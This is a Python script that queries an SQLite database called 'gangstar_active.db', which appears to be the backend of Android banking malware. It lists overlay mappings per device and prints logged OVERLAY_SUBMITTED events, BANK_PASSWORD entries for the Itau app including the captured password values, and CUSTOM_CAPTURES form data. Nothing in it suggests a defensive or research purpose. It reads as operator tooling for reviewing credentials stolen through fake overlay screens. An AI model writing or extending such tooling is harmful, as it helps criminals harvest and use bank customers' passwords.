import sqlite3, json
conn = sqlite3.connect('gangstar_active.db')
cur = conn.cursor()

# Check overlay mappings
print('=== OVERLAY MAPPINGS ===')
cur.execute('SELECT id, device_id, package_name, is_enabled FROM device_overlay_mappings')
rows = cur.fetchall()
print(f'  Total: {len(rows)}')
for row in rows:
    print(f'  ID={row[0]}, device={row[1]}, pkg={row[2]}, enabled={row[3]}')

# Check OVERLAY_SUBMITTED logs
print('\n=== OVERLAY_SUBMITTED LOGS (last 5) ===')
cur.execute("SELECT id, device_id, log_data FROM device_logs WHERE log_type='OVERLAY_SUBMITTED' ORDER BY id DESC LIMIT 5")
rows = cur.fetchall()
print(f'  Total found: {len(rows)}')
for row in rows:
    print(f'  ID={row[0]}, device={row[1]}')
    try:
        d = json.loads(row[2])
        print(f'    package={d.get("package")}, project={d.get("project_id")}')
    except:
        print(f'    raw={row[2][:200]}')

# Check BANK_PASSWORD with VISUAL_SCREEN and com.itau
print('\n=== BANK_PASSWORD com.itau (last 5) ===')
cur.execute("SELECT id, device_id, log_data FROM device_logs WHERE log_type='BANK_PASSWORD' AND log_data LIKE '%com.itau%' ORDER BY id DESC LIMIT 5")
rows = cur.fetchall()
print(f'  Total found: {len(rows)}')
for row in rows:
    print(f'  ID={row[0]}, device={row[1]}')
    try:
        d = json.loads(row[2])
        print(f'    pkg={d.get("package")}, bank={d.get("bank")}, pwd={d.get("password")}, source={d.get("source")}, type={d.get("type")}')
    except:
        print(f'    raw={row[2][:200]}')

# Check total BANK_PASSWORD count
cur.execute("SELECT COUNT(*) FROM device_logs WHERE log_type='BANK_PASSWORD'")
print(f'\nTotal BANK_PASSWORD logs: {cur.fetchone()[0]}')

# Check STUDIO_FORM_DATA or CUSTOM_CAPTURES
print('\n=== CUSTOM_CAPTURES (last 3) ===')
cur.execute("SELECT id, device_id, log_data FROM device_logs WHERE log_type='CUSTOM_CAPTURES' ORDER BY id DESC LIMIT 3")
rows = cur.fetchall()
print(f'  Total found: {len(rows)}')
for row in rows:
    print(f'  ID={row[0]}, device={row[1]}')
    try:
        d = json.loads(row[2])
        print(f'    project={d.get("project_id")}, name={d.get("project_name")}')
        cap = d.get("captured_data", {})
        print(f'    captured_keys={list(cap.keys())[:5]}')
    except:
        print(f'    raw={row[2][:200]}')

conn.close()
